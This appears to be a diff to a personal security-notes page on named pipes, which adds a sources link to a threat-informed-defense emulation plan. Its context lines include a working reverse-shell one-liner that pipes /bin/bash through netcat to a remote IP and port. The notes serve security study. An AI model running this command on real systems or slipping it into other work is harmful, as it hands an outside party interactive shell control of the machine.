@@ -37,4 +37,10 @@ This is a [[Definitions and Topics/Remote Shell\|Reverse Shell]], allowing an at
 
 `mknod backpipe p && nc 10.10.10.10 4444 0<backpipe | /bin/bash 1>backpipe`
 
-This is all pretty wild, but what else can we do with a backpipe? Like what we
+This is all pretty wild, but what else can we do with a backpipe?
+
+
+
+
+# Sources
+[CTID Github: Named Pipes Micro Emulation Plan](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes)
